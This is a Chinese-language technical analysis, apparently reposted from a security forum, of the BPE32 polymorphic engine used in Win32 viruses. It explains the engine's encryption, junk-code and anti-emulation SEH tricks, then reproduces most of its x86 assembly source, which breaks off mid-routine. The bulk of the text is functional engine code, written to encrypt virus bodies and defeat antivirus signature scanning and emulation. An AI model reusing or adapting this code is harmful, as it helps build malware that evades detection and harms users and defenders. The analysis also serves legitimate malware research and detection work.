

# BPE32 多态引擎剖析

> 原文：[`www.pediy.com/kssd/pediy10/77573.html`](https://www.pediy.com/kssd/pediy10/77573.html)

BPE32 多态引擎剖析  
  
一 BPE32 简介  
二 技术细节分析  
   2.0 -- 整体流程设计  
   2.1 -- 随机数设计  
   2.2 -- 代码加密方案  
   2.3 -- 对抗 VM 的 SEH 设计  
   2.4 -- 随机数生成与寄存器选择  
   2.5 -- 垃圾指令生成方式  
   2.6 -- 解密器设计  
   2.7 -- 重建指令流程  
三 代码解析  
四 检测方案  
  
一 BPE32 简介：  
   BPE32（Benny's Polymorphic Engine for Win32）多态引擎是由 Benny's /29A 在#4 期发布的一个病毒多态引擎，之后在病毒编写如(如 Win32.Vulcano)及壳的编写(如 ASProtect)当中都得到了应用，BPE32 是一个很不错的多态引擎,这里将从设计的角度分析该引擎。  
  
   按照 Benny's 的描述，BPE32 引擎有如下特点：  
   1 可以通过创建 SEH 来干扰一些 AV  
   2 随机使用寄存器做代码的混淆  
   3 同一功能代码，由不同的指令动态生成  
   4 功能代码具有空间随机分布  
   5 具有仿真 CALL 及 jmp 指令  
   6 在代码之间插入垃圾指令（也包括使用未公开的 SALC 指令）  
  
   我们先看一下 BPE32 的调用时的输入参数，  
   ESI  -- 指向待加密的 virus 数据。  
   EDI  -- 指向一块内存数据，用来存放由 BPE32 生成的解密器及加密数据。  
   ECX  -- 加解密数据的计数，加解密时按照 4byte 的方式操作，数据由公式(\_end - start +3)/4 获得。  
   EBP  -- 做重定位时使用。  
   输出参数,  
   EAX  -- 解码器加上加密数据后的大小，不对齐，精确到 1byte 而不是一个 DWORD  
   调用很方式简单，例如：  
   mov esi, vir\_body ; 病毒体  
   mov edi, pmem     ; 内存空间  
   mov ecx, 6c0h     ; 解密计数  
   call BPE32  
   这样调用后 pmem 里面就是一个重建的病毒代码了。  
   下面将对具体技术细节做分析。  
二 技术细节分析  
   2.0 流程设计：  
   调用 BPE32 后，将在内存中产生如下方式的 3 部分功能代码，结构如下：  
/------  +--------------------+  
|        |构造 call  decryptor |  --------->@1  
|        +--------------------+  
|        |                    |  
|        | 加密的 virus body   |  --------->@2  
|        |                    |  
\\------> |--------------------+  
         |                    |  
         |    decryptor       |  
         |                    |  --------->@3  
         +--------------------+  
  
  @1 是经过计算构造好的一个 call 调用，因为调用的具体位置要有@2 部分决定。  
  @2 是一个经过加密后的病毒体。  
  @3 是一个解密器,用于对@2 部分进行解密,该部分是经过代码混淆变换的。  
  这样每次感染其它文件后，重新生成的代码将不再有固定的特征部分，这将使得特征扫描机制失效。  
  
2.1 随机数设计：  
  BPE32 的随机数部分设计的很简单，利用了 RDTCS 指令来产生一个随机数字，通过栈中参数 X，产生一个 0 ~ X-1 之间的数字，当参数是 0 时，则直接返回产生的该数字。  
      random  proc  
      push edx  
      RDTCS  
      xor edx, edx          ;nulify EDX, we need only EAX  
      cmp \[esp+8\], edx      ;is parameter==0 ?  
      je r\_out              ;yeah, do not truncate result  
      div dword ptr \[esp+8\]  ;divide it  
      xchg eax, edx          ;remainder as result  
    r\_out:  pop edx          ;restore EDX  
      ret Pshd              ;quit procedure and destroy pushed parameter  
    random  endp  
  
2.2 代码加密方案：  
  BPE32 采用的加密方案是,先产生两个随机数,一个作为密钥 B\_key（不变的数字），一个作为增量密钥 I\_key（每次运算后相加），每次使得 B\_key + I\_key,然后 xor 待加密数据一个 DWORD,实现如下：  
  
      push 0              ;产生一个无范围的随机数  
      call random          ;  
      xchg edx, eax  
      mov \[ebp + xor\_key - mgdelta\], edx  ;存储基密钥  
      push 0              ;产生一个无范围的随机数  
      call random  
      xchg ebx, eax  
      mov \[ebp + key\_inc - mgdelta\], ebx  ;存储增量密钥  
    x\_loop:  lodsd          ;加密 virus body  
      xor eax, edx  
      stosd  
      add edx, ebx  
      loop x\_loop  
  
2.3 对抗 VM 的 SEH 设计：  
  对于上面小节中提到的 @3 部分，其实是由如下部分组成的。  
decryptor  ---->  +------------------+ <--------\\  
                |  seh handler     |          |  
                +------------------+          |  
                |  deleta geter    |          |  
                +------------------+          |  
                |   decryption     |          |  
                +------------------+          |  
                |  loop decryptor  | ---------/  
                +------------------+  
  seh handler    -- 安装一个 seh 处理过程。  
  deleta geter   -- 因为@3 部分是由垃圾指令随机填充的，所以每循环一次后需要进行一次重定位。  
  decryption     -- 解密部分，同样由垃圾指令所包围。  
  loop decryptor -- 跳向 seh handler。  
  对于 SEH BPE32 会产生如下形式的代码：  
  
        start:  
        call end\_seh\_fn  
  /---->mov esp, \[esp+8\]        ;--> 相当于 push  seh->handler  
  |      jmp seh\_rs  
  |    end\_seh\_fn:  
  |      sub edx, edx  
  |      push dword ptr fs:\[edx\] ;--> 相当于 push  seh->prev  
  |      mov fs:\[edx\], esp  
  \\-----inc byte ptr \[edx\]      ;--> 该处引发异常，跳向上面语句  
        jmp start  
      seh\_rs:  xor edi, edi  
        pop dword ptr fs:\[edi\]  
        pop edi  
   这样对于使用 vm 技术的 aver，如果没有做好 seh 仿真，将导致仿真失败，无法完成检测，而 jmp start 这条语句也很重要，有些 aver 会实现指令预取的功能(具体可参考《对抗启发式代码仿真检测技术分析》一文)，这样会另 aver 陷入无休止的仿真循环当中。  
  
2.4 随机数生成与寄存器选择  
   BPE32 通过 get\_reg 函数产生一个随机的寄存器索引，即产生 0 ~ 7 之间的整数，不使用 EAX(0),ESP(100b) ，在调用的外部也会判断是否使用了的 EBP(101b)，实现如下：  
  
        get\_reg proc  
        push 8       ; 产生一个随机的 0 ~ 7 之间的整数  
        call random  
        test eax, eax  
        je get\_reg   ;不能使用 eax  
        cmp al, 100b ;不能使用 esp  
        je get\_reg  
        ret  
        get\_reg endp  
  
2.5 垃圾指令生成方式：  
    BPE32 通过调用 rjunk 函数来产生垃圾指令，这部分可以产生 1byte，2 byte，3byte，5byte 垃圾指令，及 jmp call 类的仿真指令（无疑这类指令的加入使得 junk 看起来更像真实的指令），同时为了使 junk 的产生更加随机化，BPE32 做了一个简单映射关系。  
    0=5, 1=1+2, 2=2+1, 3=1, 4=2, 5=3, 6=none, 7=dummy jump and call  
    左侧索引(eax,随机数) = 右侧(垃圾指令字节数)，也就是 rjunk 先产生一个 0 ~ 7 的随机数，根据这个索引映射的列表，进行垃圾指令的生成，例如：  
    eax 是 0 时，产生 5byte junk  
    eax 是 1 时，产生 1byte junk 和 2byte junk  
    eax 是 2 时，则先产生 2byte junk，再产生 1byte junk  
    eax 是 7 时，产生 jmp 或 call  
    按照以上的映射关系，依次类推的产生垃圾指令，下面以 1byte junk 的代码来说如何产生垃圾代码。  
  
    1 byte junk 示例:  
    esi -- > 待加密数据  
    edi -- > 内存 buff  
    产生 1byte junk 指令到内存 buff  
    j1:  
        call junx1      ;one byte junk instruction  
        nop  
        dec eax  
        SALC  
        inc eax  
        clc  
        cwde  
        stc  
        cld  
    junx1:  
        pop esi         ; 1 byte junk 指令首地址,即指向 nop 指令  
        push 8  
        call random  
        add esi, eax    ; 随机定位一条  
        movsb           ;加入 edi 指向的内存当中  
        ret  
  其它的 junk 产生方式仅比 1byte junk 复杂一些而已，故不再赘述，BPE32 还有一个重要的功能指令产生函数，make\_xor,make\_xor2,make\_xor 主要是将指定的寄存器（由 bl 寄存器中的内容指定）清 0，make\_xor 可以产生随机的，xor,Rx,Rx / sub Rx,Rx/ mov Rx,0 这样的等效指令，make\_xor2 则产生一个指定寄存器 xor 某一数值的指令，例如：  
    mov bh，2  
    call make\_xor2  
    mov eax,01234567h  
    stosd  
    以上则产生一条 xor edx,01234567h 这样的指令，以上两个函数功能简单，故不再做过多说明。    
  
2.6 解密器设计  
  因为 BPE32 可以随机的使用寄存器，故这里用 Rx 来表示任意一个可用的寄存器,每条语句的 Rx 并不一定代表同一个寄存器。解密器的设计是 BPE32 多态的重点，我这里先将主要的功能代码表示出来。  
  
       mov  Rx，src      --------  I1  获得待解密的地址，放入 Rx 中  
       mov  Rx, cnt      --------  I2  获得要解密的此时，放入 Rx 中  
  /--->xor  Rx，Rx       --------  I3  解密  
  |     add  Rx，4        --------  I4  待解密的地址加 4  
  |     add  Rx，1        --------  I5  计数器加 1  
  |     add  Rx，Rx       --------  I6  基密钥 + 增量密钥  
  |     jcxz xxx          --------  I7  测试解密是否完成,完成后跳出循环  
  \\--- jmp  xxx          --------  I8  继续解密  
  
   BPE32 围绕 I1 ~ I8 ，通过随机寄存器、插入垃圾指令、变换指令顺序、同等指令替换等手段产生来产生数据不同但功能相同的解密代码，下面我将列举一个去除垃圾指令的 BPE32 产生的解密代码。  
      0040202B    E8 00000000     CALL T-BPE32.00402030          ;构造的一个 call  
  
      00402030    8B3C24          MOV EDI,DWORD PTR SS:\[ESP\]  
      00402033    58              POP EAX  
      00402034    81EF 30204000   SUB EDI,T-BPE32.00402030       ;构造一个重定位  
      ; I1 的一种生成方式，F7973BCB 为随机产生的一个密钥，xor 后，ecx 指向了最初 call 调用后地址，即待解密数据首地址  
      0040203A    68 CB3B97F7     PUSH F7973BCB                   ;构造一个随机加密的密钥，使得 ecx 指向最初的一个 call 调用  
      0040203F    59              POP ECX                        ;这里 ecx 寄存器随机生成  
      00402040    81F1 CE1BD7F7   XOR ECX,F7D71BCE  
  
      00402046    03CF            ADD ECX,EDI                     ;加重定位，获得真正数据的指向  
      ;I2 的一种生成方式，方案类似于 I1  
      00402048    33D2            XOR EDX,EDX                    ; 获得解密的次数，同样采用随机密钥来混淆  
      0040204A    81C2 68D4F805   ADD EDX,5F8D468  
      00402050    81F2 6AD4F805   XOR EDX,5F8D46A  
      ;I3  
      00402056    2BDB            SUB EBX,EBX                    ;获得密钥，该处密钥均为 0  
      00402058    81C3 00000000   ADD EBX,0  
      0040205E    3119            XOR DWORD PTR DS:\[ECX\],EBX     ;解密  
  
      ;I4 使计数增加的一种方式  
      00402060    41              INC ECX                         ;源数据增加 4  
      00402061    41              INC ECX  
      00402062    41              INC ECX  
      00402063    41              INC ECX  
  
      ;I5  
      00402064    B8 CC54578A     MOV EAX,8A5754CC               ;循环计数减 1  
      00402069    2BD0            SUB EDX,EAX  
      0040206B    81C2 CB54578A   ADD EDX,8A5754CB  
      ;I6  
      00402071    B8 00000000     MOV EAX,0                       ;基址密钥+增量密钥加（目前增量是 0）  
      00402076    03D8            ADD EBX,EAX  
      ;I7  
      00402078    51              PUSH ECX  
      00402079    8BCA            MOV ECX,EDX  
  /---0040207B    E3 03           JECXZ SHORT T-BPE32.00402080   ;测试看解密是否完成  
  |   ;I8  
  |    0040207D    59              POP ECX  
  |    0040207E  ^ EB DE           JMP SHORT T-BPE32.0040205E     ;继续进行解密  
  \\-->00402080    59              POP ECX  
      00402081    61              POPAD  
      00402082    C3              RETN  
2.7 重建指令流程  
    针对解密器，BPE32 对执行先后顺序无关的代码，进行了重新排列，首先 BPE32 现将这些功能分成 8 个部分，即 greg0 ~ greg7 个处理例程。其中：  
    greg0  -- 产生 SEH 部分代码  
    greg1  -- 产生 SEH 部分代码  
    greg2  -- 产生 mov Rx，src 类代码  
    greg3  -- 产生 mov Rx, cnt 类代码  
    以上部分例程不进行代码重排序。  
    greg4  --  产生密钥自增代码  
    greg5  -- 产生待解密数据自增代码  
    greg6  -- 产生计数器自减的代码  
    greg7  -- 产生解密跳转的代码  
    BPE32 会对 greg4 ~ greg6 进行重排序，因这几部分代码进行重排序，不会影响解密代码功能，以此来达到代码混淆的目的。同时这几部分功能都有能力产生，功能一致但代码不同的新指令如:  
    greg4 提供 4 种等效方案,供随机选择  
    1：XCHG EAX, Rx    
       XOR Rx, Rx     
       OR Rx, EAX  
       ADD Rx, value  
    2: add Rx,value  
    3: mov eax,value  
       add Rx,eax  
    4: mov eax,Rx  
       add eax,value  
       xchg eax,Rx  
   greg5 提供多种等效方案，供随机选择,如  
   1：  
   inc Rx  ;执行 4 次  
   2:                       3:   
   mov eax,Rx ,             mov eax,4  
   add eax,4                add Rx,eax  
   xchg eax,Rx  
   greg6 提供了 4 种等效方案，供随机选择  
   1:sub Rx，1   
   2:dec Rx，1      
   3:  
   mov eax, random\_v  
   sub Rx, eax  
   add reg,random -1  
   4:  
   xchg eax,Rx  
   dec eax  
   xchg eax,Rx  
   greg7 提供了两种等效方案，供随机选择  
   1：  
    push ecx  
    mov ecx, reg  
    jecxz label  
    pop ecx  
    jmp decrypt\_loop  
    label:  
    pop ecx  
  2 ：  
    xor eax, eax  
    dec eax  
    add eax, reg  
    jns decrypt\_loop  
  而整体 greg4 ~ greg6 的排序规则由如下代码产生：  
  push 6            ;产生 0 ~ 5 种方案的随机排列顺序  
  call random          
  test eax, eax  
  je g5            ;greg4 - key incremention  
  cmp al, 1        ;greg5 - source incremention  
  je g1            ;greg6 - count decremention  
  cmp al, 2        ;greg7 - decryption loop  
  je g2  
  cmp al, 3  
  je g3  
  cmp al, 4  
  je g4  
  g0:  call gg1  
    call greg6  
    jmp g\_end  
  g1:  call gg2  
    call greg5  
    jmp g\_end  
  g2:  call greg5  
    call gg2  
    jmp g\_end  
  g3:  call greg5  
  gg3:  call greg6  
    jmp g\_out  
  g4:  call greg6  
    call gg1  
    jmp g\_end  
  g5:  call greg6  
    call greg5  
  g\_out:  call greg4  
  g\_end:  call greg7  
    mov al, 61h          
    stosb                
    call rjunk          
    mov al, 0c3h      
    stosb                
    pop eax            
    sub eax, edi      
    neg eax            
    mov \[esp.Pushad\_eax\], eax      
    popad            
    ret          ;整个 BPE32 结束  
三 代码解析  
   下面将对 BPE32 关键处的代码做简要的注释；  
RDTCS  equ  <dw  310Fh>    ;RDTCS opcode  
SALC  equ  <db  0D6h>      ;SALC opcode  
BPE32   Proc  
  pushad          ;save all regs  
  push edi        ;save these regs for l8r use  
  push ecx        ;  ...  
  mov edx, edi    ;  ...  
  push esi        ;preserve this reg  
  call rjunk      ;generate random junk instructions  
  pop esi          ;restore it  
  mov al, 0e8h    ;create CALL instruction  
  stosb            ;  ...  
  mov eax, ecx    ;  ...  
  imul eax, 4      ;  ...  
  stosd            ;  ...  
  ;edx 保存有最开始的 edi   
  mov eax, edx        ;calculate size of CALL+junx  
  sub edx, edi        ;  ...  
  neg edx              ;  ...  
  add edx, eax        ;  ...  
  push edx            ;保存 call 与 填充垃圾指令的差值      
  push 0              ;get random number  
  call random          ;  ...  
  xchg edx, eax  
  mov \[ebp + xor\_key - mgdelta\], edx  ;use it as xor constant  
  push 0          ;get random number  
  call random        ;  ...  
  xchg ebx, eax  
  mov \[ebp + key\_inc - mgdelta\], ebx  ;use it as key increment constant  
x\_loop:  lodsd          ;load DWORD  
  xor eax, edx        ;encrypt it  
  stosd          ;store encrypted DWORD  
  add edx, ebx        ;increment key  
  loop x\_loop        ;next DWORD  
;  以上完成了对病毒体的加密  
;  下面进行利用 SEH 对抗 AV VM 仿真  
  call rjunk              ;generate junx  
  mov eax, 0006e860h      ;generate SEH handler  
  stosd          ;  ...  
  mov eax, 648b0000h      ;  ...  
  stosd          ;  ...  
  mov eax, 0ceb0824h      ;  ...  
  stosd          ;  ...  
  ;以上产生类似如下代码  
  ;pushad  
  ;call t\_bpe32.0040200c  
  ;mov esp,dword ptr ss:\[esp+8\]  
  ;jmp short t\_bpe32.00402018    
greg0:  call get\_reg        ;get random register  
  cmp al, 5                  ;MUST NOT be EBP register  
  je greg0  
  mov bl, al                ;store register  
  ;dl 是参数,11 是产生非 mov reg,reg 指令的标志  
  mov dl, 11                ;proc parameter (do not generate MOV)  
  call make\_xor              ;create XOR or SUB instruction  
  inc edx                    ;destroy parameter  
  mov al, 64h                ;generate FS:  
  stosb                      ;store it  
  mov eax, 896430ffh        ;next SEH instructions  
  or ah, bl                  ;change register  
  stosd                      ;store them  
  mov al, 20h                ;  ...  
  add al, bl                ;  ...  
  stosb                      ;  ...  
  ;以上将产生类似如下代码  
  ;xor Rx,Rx  
  ;push dword ptr fs:\[Rx\]  
  ;mov  dword ptr fs:\[Rx\],esp    
  push 2              ;get random number  
  call random  
  test eax, eax  
  je \_byte\_  
  mov al, 0feh        ;generate INC DWORD PTR  
  jmp \_dw\_  
\_byte\_:  mov al, 0ffh  ;generate INC BYTE PTR  
\_dw\_:  stosb            ;store it  
  mov al, bl          ;store register  
  stosb            
  mov al, 0ebh        ;generate JUMP SHORT  
  stosb            
  mov al, -24d        ;generate jump to start of code (trick  
  stosb               ;for better emulators, e.g. NODICE32)  
; 以上产生类似如下代码     
;  inc byte ptr \[edx\]  
; jmp start               
  call rjunk                ;generate junx  
greg1:  call get\_reg        ;generate random register  
  cmp al, 5                  ;MUST NOT be EBP  
  je greg1  
  mov bl, al                ;store it  
  call make\_xor              ;generate XOR,SUB reg, reg or MOV reg, 0  
  mov al, 64h                 ;next SEH instructions  
  stosb            
  mov al, 8fh          
  stosb            
  mov al, bl          
  stosb            
  mov al, 58h          
  add al, bl          
  stosb      
  mov al, 0e8h        ;generate CALL  
  stosb            
  xor eax, eax          
  stosd            
  push edi          ;store for l8r use  
  call rjunk        ;call junk generator  
  
  call get\_reg      ;random register  
  mov bl, al        ;store it  
  push 1            ;random number (0-1)  
  call random          
  test eax, eax  
  jne next\_delta  
  mov al, 8bh        ;generate MOV reg, \[ESP\]; POP EAX  
  stosb  
  mov al, 80h  
  or al, bl  
  rol al, 3  
  stosb  
  mov al, 24h  
  stosb  
  mov al, 58h  
  jmp bdelta  
;以上产生类似如下代码  
;seh\_rs:    
;  xor Rx, Rx  
;  pop dword ptr fs:\[Rx\]  
;  pop Rx  
next\_delta:  
  mov al, bl        ;generate POP reg; SUB reg, ...  
  add al, 58h  
bdelta:  stosb  
  mov al, 81h  
  stosb  
  mov al, 0e8h  
  add al, bl  
  stosb  
  pop eax  
  stosd  
  call rjunk        ;random junx  
  ;做一个随机的重定位    
  xor bh, bh        ;parameter (first execution only)  
  call greg2        ;generate MOV sourcereg, ...  
  mov al, 3          ;generate ADD sourcereg, deltaoffset  
  stosb            
  mov al, 18h          
  or al, bh          
  rol al, 3          
  or al, bl          
  stosb            
  mov esi, ebx      ;store EBX  
  call greg2        ;generate MOV countreg, ...  
  mov cl, bh        ;store count register  
  mov ebx, esi        ;restore EBX  
  
  call greg3        ;generate MOV keyreg, ...  
  push edi          ;store this position for jump to decryptor  
  mov al, 31h        ;generate XOR \[sourcereg\], keyreg  
  stosb            
  mov al, ch          
  rol al, 3          
  or al, bh          
  stosb            
  push 6            ;this stuff will choose ordinary of calls  
  call random        ;to code generators  
  test eax, eax  
  je g5              ;greg4 - key incremention  
  cmp al, 1          ;greg5 - source incremention  
  je g1              ;greg6 - count decremention  
  cmp al, 2          ;greg7 - decryption loop  
  je g2  
  cmp al, 3  
  je g3  
  cmp al, 4  
  je g4  
g0:  call gg1  
  call greg6  
  jmp g\_end  
g1:  call gg2  
  call greg5  
  jmp g\_end  
g2:  call greg5  
  call gg2  
  jmp g\_end  
g3:  call greg5  
gg3:  call greg6  
  jmp g\_out  
g4:  call greg6  
  call gg1  
  jmp g\_end  
g5:  call greg6  
  call greg5  
g\_out:  call greg4  
g\_end:  call greg7  
  mov al, 61h        ;generate POPAD instruction  
  stosb            
  call rjunk        ;junk instruction generator  
  mov al, 0c3h      ;RET instruction  
  stosb            
  pop eax            ;calculate size of decryptor and encrypted data  
  sub eax, edi          
  neg eax            
  mov \[esp.Pushad\_eax\], eax    ;store it to EAX register  
  popad              ;restore all regs  
  ret                ;and thats all folx  
get\_reg proc        ;this procedure generates random register  
  push 8            ;random number (0-7)  
  call random        ;  ...  
  test eax, eax  
  je get\_reg        ;MUST NOT be 0 (=EAX is used as junk register)  
  cmp al, 100b        ;MUST NOT be ESP  
  je get\_reg  
  ret  
get\_reg endp  
make\_xor proc        ;this procedure will generate instruction, that  
  push 3            ;will nulify register (BL as parameter)  
  call random  
  test eax, eax  
  je \_sub\_  
  cmp al, 1  
  je \_mov\_  
  mov al, 33h          ;generate XOR reg, reg  
  jmp \_xor\_  
\_sub\_:  mov al, 2bh    ;generate SUB reg, reg  
\_xor\_:  stosb  
  mov al, 18h  
  or al, bl  
  rol al, 3  
  or al, bl  
  stosb  
  ret  
\_mov\_:  cmp dl, 11        ;generate MOV reg, 0  
  je make\_xor  
  mov al, 0b8h  
  add al, bl  
  stosb  
  xor eax, eax  
  stosd  
  ret  
make\_xor endp  
gg1:  call greg4  
  jmp greg5  
gg2:  call greg4  
  jmp greg6  
  
random  proc          ;this procedure will generate random number              
  push edx            ;save EDX  
  RDTCS                ;RDTCS instruction - reads PCs tix and stores  
  xor edx, edx        ;nulify EDX, we need only EAX  
  cmp \[esp+8\], edx    ;is parameter==0 ?  
  je r\_out          
  div dword ptr \[esp+8\]  ;divide it  
  xchg eax, edx          ;remainder as result  
r\_out:  pop edx          ;restore EDX  
  ret Pshd              ;quit procedure and destroy pushed parameter  
random  endp  
make\_xor2 proc          ;create XOR instruction  
  mov al, 81h  
  stosb  
  mov al, 0f0h  
  add al, bh  
  stosb  
  ret  
make\_xor2 endp  
greg2  proc          ;1 parameter = source/count value  
  call get\_reg      ;get register  
  cmp al, bl        ;already used ?  
  je greg2  
  cmp al, 5  
  je greg2  
  cmp al, bh  
  je greg2  
  mov bh, al  
  mov ecx, \[esp+4\]      ;get parameter(构造的第一个 call 指令后下一个地址)  
  push 5                ;choose instructions  
  call random  
  test eax, eax  
  je s\_next0  
  cmp al, 1  
  je s\_next1  
  cmp al, 2  
  je s\_next2  
  cmp al, 3  
  je s\_next3  
  
  mov al, 0b8h        ;MOV reg, random\_value  
  add al, bh          ;XOR reg, value  
  stosb                ;param = random\_value xor value  
  push 0  
  call random  
  xor ecx, eax  
  stosd  
  call make\_xor2  
  mov eax, ecx  
  jmp n\_end2  
s\_next0:mov al, 68h    ;PUSH random\_value  
  stosb                ;POP reg  
  push 0              ;XOR reg, value  
  call random          ;result = random\_value xor value  
  xchg eax, ecx  
  xor eax, ecx  
  stosd  
  mov al, 58h  
  add al, bh  
  stosb  
  call make\_xor2  
  xchg eax, ecx  
  jmp n\_end2  
s\_next1:mov al, 0b8h  ;MOV EAX, random\_value  
  stosb                ;MOV reg, EAX  
  push 0              ;SUB reg, value  
  call random          ;result = random\_value - value  
  stosd  
  push eax  
  mov al, 8bh  
  stosb  
  mov al, 18h  
  or al, bh  
  rol al, 3  
  stosb  
  mov al, 81h  
  stosb  
  mov al, 0e8h  
  add al, bh  
  stosb  
  pop eax  
  sub eax, ecx  
  jmp n\_end2  
s\_next2:push ebx    ;XOR reg, reg  
  mov bl, bh        ;XOR reg, random\_value  
  call make\_xor      ;ADD reg, value  
  pop ebx            ;result = random\_value + value  
  call make\_xor2  
  push 0  
  call random  
  sub ecx, eax  
  stosd  
  push ecx  
  call s\_lbl  
  pop eax  
  jmp n\_end2  
s\_lbl:  mov al, 81h        ;create ADD reg, ... instruction  
  stosb  
  mov al, 0c0h  
  add al, bh  
  stosb  
  ret  
s\_next3:push ebx        ;XOR reg, reg  
  mov bl, bh            ;ADD reg, random\_value  
  call make\_xor          ;XOR reg, value  
  pop ebx                ;result = random\_value xor value  
  push 0  
  call random  
  push eax  
  xor eax, ecx  
  xchg eax, ecx  
  call s\_lbl  
  xchg eax, ecx  
  stosd  
  call make\_xor2  
  pop eax    
n\_end2:  stosd  
  push esi  
  call rjunk  
  pop esi  
  ret Pshd  
greg2  endp  
greg3  proc  
  call get\_reg        ;get register  
  cmp al, 5            ;already used ?  
  je greg3  
  cmp al, bl  
  je greg3  
  cmp al, bh  
  je greg3  
  cmp al, cl  
  je greg3  
  mov ch, al  
  mov edx, 0        ;get encryption key value  
xor\_key = dword ptr $ - 4  
  push 3  
  call random  
  test eax, eax  
  je k\_next1  
  cmp al, 1  
  je k\_next2  
  push ebx          ;XOR reg, reg  
  mov bl, ch        ;OR, ADD, XOR reg, value  
  call make\_xor  
  pop ebx  
  
  mov al, 81h  
  stosb  
  push 3  
  call random  
  test eax, eax  
  je k\_nxt2  
  cmp al, 1  
  je k\_nxt3  
  mov al, 0c0h  
k\_nxt1:  add al, ch  
  stosb  
  xchg eax, edx  
n\_end1:  stosd  
k\_end:  call rjunk  
  ret  
k\_nxt2:  mov al, 0f0h  
  jmp k\_nxt1  
k\_nxt3:  mov al, 0c8h  
  jmp k\_nxt1  
k\_next1:mov al, 0b8h        ;MOV reg, value  
  jmp k\_nxt1  
k\_next2:mov al, 68h          ;PUSH value  
  stosb          ;POP reg  
  xchg eax, edx  
  stosd  
  mov al, ch  
  add al, 58h  
  jmp i\_end1  
greg3  endp  
greg4  proc  
  mov edx, 0       ;get key increment value  
key\_inc = dword ptr $ - 4  
i\_next:  push 3  
  call random  
  test eax, eax  
  je i\_next0  
  cmp al, 1  
  je i\_next1  
  cmp al, 2  
  je i\_next2  
  mov al, 90h        ;XCHG EAX, reg  
  add al, ch        ;XOR reg, reg  
  stosb              ;OR reg, EAX  
  push ebx          ;ADD reg, value  
  mov bl, ch  
  call make\_xor  
  pop ebx  
  mov al, 0bh  
  stosb  
  mov al, 18h  
  add al, ch  
  rol al, 3  
  stosb  
i\_next0:mov al, 81h        ;ADD reg, value  
  stosb  
  mov al, 0c0h  
  add al, ch  
  stosb  
  xchg eax, edx  
  jmp n\_end1  
i\_next1:mov al, 0b8h        ;MOV EAX, value  
  stosb                      ;ADD reg, EAX  
  xchg eax, edx  
  stosd  
  mov al, 3  
  stosb  
  mov al, 18h  
  or al, ch  
  rol al, 3  
i\_end1:  stosb  
i\_end2:  call rjunk  
  ret  
i\_next2:mov al, 8bh        ;MOV EAX, reg  
  stosb                    ;ADD EAX, value  
  mov al, 0c0h            ;XCHG EAX, reg  
  add al, ch  
  stosb  
  mov al, 5  
  stosb  
  xchg eax, edx  
  stosd  
  mov al, 90h  
  add al, ch  
  jmp i\_end1  
greg4  endp  
greg5  proc  
  push ecx  
  mov ch, bh  
  push 4  
  pop edx  
  push 2  
  call random  
  test eax, eax  
  jne ng5  
  call i\_next        ;same as previous, value=4  
  pop ecx  
  jmp k\_end  
ng5:  mov al, 40h        ;4x inc reg  
  add al, ch  
  pop ecx  
  stosb  
  stosb  
  stosb  
  jmp i\_end1  
greg5  endp  
greg6  proc  
  push 5  
  call random  
  test eax, eax  
  je d\_next0  
  cmp al, 1  
  je d\_next1  
  cmp al, 2  
  je d\_next2  
  mov al, 83h        ;SUB reg, 1  
  stosb  
  mov al, 0e8h  
  add al, cl  
  stosb  
  mov al, 1  
  jmp i\_end1  
d\_next0:mov al, 48h        ;DEC reg  
  add al, cl  
  jmp i\_end1  
d\_next1:mov al, 0b8h        ;MOV EAX, random\_value  
  stosb                      ;SUB reg, EAX  
  push 0                    ;ADD reg, random\_value-1  
  call random  
  mov edx, eax  
  stosd  
  mov al, 2bh  
  stosb  
  mov al, 18h  
  add al, cl  
  rol al, 3  
  stosb  
  mov al, 81h  
  stosb  
  mov al, 0c0h  
  add al, cl  
  stosb  
  dec edx  
  mov eax, edx  
  jmp n\_end1  
d\_next2:mov al, 90h        ;XCHG EAX, reg  
  add al, cl              ;DEC EAX  
  stosb                    ;XCHG EAX, reg  
  mov al, 48h  
  stosb  
  mov al, 90h  
  add al, cl  
  jmp i\_end1  
greg6  endp  
  
greg7  proc  
  mov edx, \[esp+4\]  
  dec edx  
  push 2  
  call random  
  test eax, eax  
  je l\_next0  
  mov al, 51h        ;PUSH ECX  
  stosb              ;MOV ECX, reg  
  mov al, 8bh        ;JECXZ label  
  stosb              ;POP ECX  
  mov al, 0c8h      ;JMP decrypt\_loop  
  add al, cl        ;label:  
  stosb              ;POP ECX  
  mov eax, 0eb5903e3h  
  stosd  
  sub edx, edi  
  mov al, dl  
  stosb  
  mov al, 59h  
  jmp l\_next  
l\_next0:push ebx    ;XOR EAX, EAX  
  xor bl, bl        ;DEC EAX  
  call make\_xor      ;ADD EAX, reg  
  pop ebx            ;JNS decrypt\_loop  
  mov al, 48h  
  stosb  
  mov al, 3  
  stosb  
  mov al, 0c0h  
  add al, cl  
  stosb  
  mov al, 79h  
  stosb  
  sub edx, edi  
  mov al, dl  
l\_next:  stosb  
  call rjunk  
  ret Pshd  
greg7  endp  
  
rjunkjc:push 7  
  call random  
  jmp rjn  
  
    
rjunk  proc      ;junk instruction generator  
  push 8  
  call random    ;0=5, 1=1+2, 2=2+1, 3=1, 4=2, 5=3, 6=none, 7=dummy jump and call  
                ;左侧索引(eax,随机数) = 右侧(垃圾指令字节数)  
rjn:  test eax, eax  
  je j5  
  cmp al, 1  
  je j\_1x2  
  cmp al, 2  
  je j\_2x1  
  cmp al, 4  
  je j2  
  cmp al, 5  
  je j3  
  cmp al, 6  
  je r\_end  
  cmp al, 7  
  je jcj  
j1:  call junx1    ;one byte junk instruction  
  nop  
  dec eax  
  SALC  
  inc eax  
  clc  
  cwde  
  stc  
  cld  
junx1:  pop esi  
  push 8  
  call random  
  add esi, eax  
  movsb  
  ret  
j\_1x2:  call j1      ;one byte and two byte  
  jmp j2  
j\_2x1:  call j2      ;two byte and one byte  
  jmp j1  
j3:  call junx3  
  db  0c1h, 0c0h  ;rol eax, ...  
  db  0c1h, 0e0h  ;shl eax, ...  
  db  0c1h, 0c8h  ;ror eax, ...  
  db  0c1h, 0e8h  ;shr eax, ...  
  db  0c1h, 0d0h  ;rcl eax, ...  
  db  0c1h, 0f8h  ;sar eax, ...  
  db  0c1h, 0d8h  ;rcr eax, ...  
  db  083h, 0c0h  
  db  083h, 0c8h  
  db  083h, 0d0h  
  db  083h, 0d8h  
  db  083h, 0e0h  
  db  083h, 0e8h  
  db  083h, 0f0h  
  db  083h, 0f8h  ;cmp eax, ...  
  db  0f8h, 072h  ;clc; jc ...  
  db  0f9h, 073h  ;stc; jnc ...  
junx3:  pop esi      ;three byte junk instruction  
  push 17  
  call random  
  imul eax, 2  
  add esi, eax  
  movsb  
  movsb  
r\_ran:  push 0  
  call random  
  test al, al  
